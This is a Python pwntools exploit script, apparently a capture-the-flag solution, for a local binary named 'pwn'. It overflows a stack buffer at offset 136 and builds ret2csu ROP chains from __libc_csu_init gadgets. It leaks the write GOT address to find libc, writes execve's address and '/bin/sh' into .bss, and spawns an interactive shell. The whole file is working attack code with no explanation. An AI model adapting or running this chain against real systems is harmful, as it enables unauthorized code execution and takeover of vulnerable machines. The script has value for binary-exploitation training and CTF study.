from pwn import *

p = process('./pwn')
elf = ELF('pwn')
libc = ELF('libc.so.6')
context.log_level = 'debug'

offset = 136
libc_init = 0x40061a
write_got = elf.got['write']
read_got = elf.got['read']
bss_addr = 0x601040
main_addr = 0x400566
init_2 = 0x400600
playload = 'A'*136 + p64(libc_init) + p64(0) + p64(1) + p64(write_got)
playload += p64(8) + p64(write_got) + p64(1) + p64(init_2) + 'A'*56 + p64(main_addr)
p.recvuntil('0123')
p.sendline(playload)

data = u64(p.recv(8))
data = hex(data)
print data
base = int(data,16) - libc.symbols['write']
execv_addr = base + libc.symbols['execve']
print hex(execv_addr)

sleep(1)

playload2 = 'A'*136 + p64(libc_init) + p64(0) + p64(1) + p64(read_got)
playload2 += p64(16) + p64(bss_addr) + p64(0) + p64(init_2) + 'A'*56 + p64(main_addr)
p.sendline(playload2)
sleep(1)
p.send(p64(execv_addr) + '/bin/sh\x00')

sleep(1)
playload3 = 'A'*136 + p64(libc_init) + p64(0) + p64(1) + p64(bss_addr)
playload3 += p64(0) + p64(0) + p64(bss_addr + 8) + p64(init_2) + 'A'*56 + p64(main_addr)
p.sendline(playload3)

p.interactive()
